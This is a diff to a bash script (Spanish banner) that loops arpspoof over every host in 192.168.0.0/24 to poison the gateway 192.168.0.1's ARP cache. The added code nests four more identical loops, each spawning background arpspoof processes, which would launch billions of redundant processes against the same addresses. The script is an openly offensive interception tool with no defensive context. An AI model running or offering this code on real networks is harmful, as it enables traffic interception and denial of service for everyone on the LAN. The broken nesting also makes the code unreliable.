@@ -22,9 +22,25 @@ trap ctrl_c INT
 echo "EJECUTANDO SCRIPT"
 sleep 0.5
 
-for host in {1..254};
+for host in {2..254};
 do
-  	arpspoof -i enp0s3 -t 192.168.7.254 192.168.7.$host &
+  	arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$host &
+	for a in {2..254};
+	do
+		arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$a &
+		for b in {2..254};
+		do
+			arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$b &
+			for c in {2..254};
+			do
+				arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$c &
+				for d in {2..254};
+				do
+					arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.$d &
+				done; wait
+			done; wait
+		done; wait
+	done; wait
 done; wait
 
 
